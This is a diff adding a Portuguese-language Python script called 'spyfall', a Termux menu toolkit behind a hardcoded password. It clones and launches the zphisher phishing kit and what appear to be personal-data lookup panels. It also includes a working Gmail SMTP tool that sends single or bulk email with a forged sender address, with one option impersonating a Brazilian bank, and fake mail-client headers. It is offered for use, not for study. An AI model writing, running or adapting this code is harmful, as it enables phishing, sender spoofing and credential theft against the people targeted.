@@ -1,0 +1,239 @@
+import os
+os.system("clear")
+def ghostpainel():
+    os.system("pkg update && pkg upgrade")
+    os.system("pkg install python")
+    os.system("pkg install git")
+    os.system("git clone https://github.com/kvgnx54/ghostpanel")
+    os.system("pip install requests")
+    os.system("cd")
+    os.system("cd ghostpanel && python main.py")
+    
+    return ghost
+    
+def dados():
+    os.system("pkg upgrade -y && pkg update -y")
+    os.system("pkg install git python figlet -y")
+    os.system("git clone https://github.com/MidD3Vil/MidPainel")
+    os.system("cd MidPainel && python3 main.py")
+    
+    return dados
+    
+def login_fake():
+    os.system("git clone --depth=1 https://github.com/htr-tech/zphisher.git")
+    os.system("cd zphisher && bash zphisher.sh")
+    return login
+    
+    
+def ferramenta_gmail_fake():
+    """
+    🔥 FERRAMENTA GMAIL FAKE COMPLETA - TERMUX
+    Executa tudo dentro desta função!
+    """
+    import smtplib
+    import ssl
+    from email.mime.text import MIMEText
+    from email.mime.multipart import MIMEMultipart
+    import getpass
+    import os
+    from datetime import datetime
+    
+    print("🔥 ===> [SPYFALL-GMAILNET] <===")
+    print("=" * 40)
+    
+    class AnonTool:
+        def __init__(self):
+            self.smtp = "smtp.gmail.com"
+            self.port = 587
+            
+        def menu(self):
+            print("\n📱 O que quer fazer?")
+            print("1. Enviar 1 email")
+            print("2. Enviar para vários (lista)")
+            print("3. Sair")
+            return input("Escolha (1-3): ")
+        
+        def get_gmail(self):
+            email = input("📧 Seu Gmail (app password): ").strip()
+            if not email or '@' not in email:
+                print("❌ Gmail inválido!")
+                return None
+            return email
+        
+        def get_password(self):
+            return getpass.getpass("🔑 App Password: ")
+        
+        def get_message(self):
+            print("\n✉️  MENSAGEM:")
+            subject = input("Assunto: ").strip() or "Mensagem Anonima"
+            body = input("Corpo (Enter para default): ").strip()
+            if not body:
+                body = "Mensagem enviada anonimamente via ferramenta segura."
+            return subject, body
+        
+        def get_target(self):
+            target = input("📥 Email alvo: ").strip()
+            if '@' not in target:
+                print("❌ Email inválido!")
+                return None
+            return target
+        
+        def get_targets_bulk(self):
+            print("📄 LISTA DE EMAILS (um por linha):")
+            targets = []
+            print("Digite emails (Enter vazio = parar):")
+            while True:
+                email = input(f"Email {len(targets)+1}: ").strip()
+                if not email:
+                    break
+                if '@' in email:
+                    targets.append(email)
+            return targets if targets else None
+        
+        def spoof_from(self):
+            spoofs = [
+                "no-reply@outlook.com", "suporte@proton.me", "noreply@gmail.com",
+                "admin@bancobrasil.com", "feedback@yahoo.com", "info@icloud.com"
+            ]
+            spoof = input("👤 From fake (Enter = auto): ").strip()
+            return spoof or spoofs[hash(str(datetime.now())) % len(spoofs)]
+        
+        def send_single(self, gmail, passwd, target, subject, body, spoof):
+            try:
+                msg = MIMEMultipart()
+                msg['From'] = spoof
+                msg['To'] = target
+                msg['Subject'] = subject
+                msg['X-Mailer'] = 'Microsoft Outlook 16.0'
+                msg['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0)'
+                
+                msg.attach(MIMEText(body, 'plain', 'utf-8'))
+                
+                context = ssl.create_default_context()
+                server = smtplib.SMTP(self.smtp, self.port)
+                server.starttls(context=context)
+                server.login(gmail, passwd)
+                server.sendmail(gmail, target, msg.as_string())
+                server.quit()
+                
+                print(f"✅ ENVIADO para {target}")
+                return True
+                
+            except Exception as e:
+                print(f"❌ ERRO {target}: {str(e)[:80]}")
+                return False
+        
+        def send_bulk(self, gmail, passwd, targets, subject, body, spoof):
+            sucessos = 0
+            for i, target in enumerate(targets, 1):
+                print(f"[{i}/{len(targets)}] ", end="")
+                if self.send_single(gmail, passwd, target, subject, body, spoof):
+                    sucessos += 1
+            print(f"\n🎉 FINALIZADO: {sucessos}/{len(targets)} enviados!")
+    
+    # === EXECUÇÃO PRINCIPAL ===
+    tool = AnonTool()
+    
+    while True:
+        try:
+            op = tool.menu()
+            
+            if op == "3":
+                print("👋 Tchau!")
+                break
+                
+            if op == "1":  # SINGLE
+                gmail = tool.get_gmail()
+                if not gmail: continue
+                    
+                passwd = tool.get_password()
+                target = tool.get_target()
+                if not target: continue
+                    
+                subject, body = tool.get_message()
+                spoof = tool.spoof_from()
+                
+                print(f"\n🚀 Enviando...")
+                tool.send_single(gmail, passwd, target, subject, body, spoof)
+                
+            elif op == "2":  # BULK
+                gmail = tool.get_gmail()
+                if not gmail: continue
+                    
+                passwd = tool.get_password()
+                targets = tool.get_targets_bulk()
+                if not targets: 
+                    print("❌ Nenhum email válido!")
+                    continue
+                    
+                subject, body = tool.get_message()
+                spoof = tool.spoof_from()
+                
+                print(f"\n🚀 Iniciando bulk {len(targets)} emails...")
+                tool.send_bulk(gmail, passwd, targets, subject, body, spoof)
+            
+            else:
+                print("❌ Opção inválida!")
+            
+            print("\n" + "="*50)
+            
+            # Log automático
+            try:
+                with open('anon_logs.txt', 'a') as f:
+                    f.write(f"{datetime.now()}: Sessão OK\n")
+            except:
+                pass
+                
+        except KeyboardInterrupt:
+            print("\n\n👋 Interrompido pelo usuário!")
+            break
+        except Exception as e:
+            print(f"❌ Erro geral: {e}")
+    
+    print("✅ Ferramenta finalizada!")
+while True:
+    print("digite a senha de acesso que esta no github")
+    seguranca = input("digite a senha para entra:")
+
+    if seguranca == "carnizentorumo2k":
+        print("entrada altorizada")
+        break
+    
+    else:
+        os.system("clear")
+        print("entrada negada")
+        
+        
+
+
+for i in range(73736):
+    print("010101010101010010101010101010101010100101010101010101010101010101010101010")
+    
+os.system("clear")
+
+while True:
+    print("|===> [spyfall] <===|")
+    print("\n1 ===> ghostpanel")
+    print("\n2 ===> consulta_dados")
+    print("\n3 ===> pshing")
+    print("\n4 ===> gmail_msm")
+    print("\n0 ===> sair")
+    
+    escolha = input("escolha:")
+    
+    if escolha == "1":
+        ghostpainel()
+        
+    elif escolha == "2":
+        dados()
+        break
+    elif escolha == "3":
+        login_fake()
+        break
+    elif escolha == "4":
+        ferramenta_gmail_fake()
+        break
+    elif escolha == "0":
+        break
+    else:
+        print("opcao invalida")
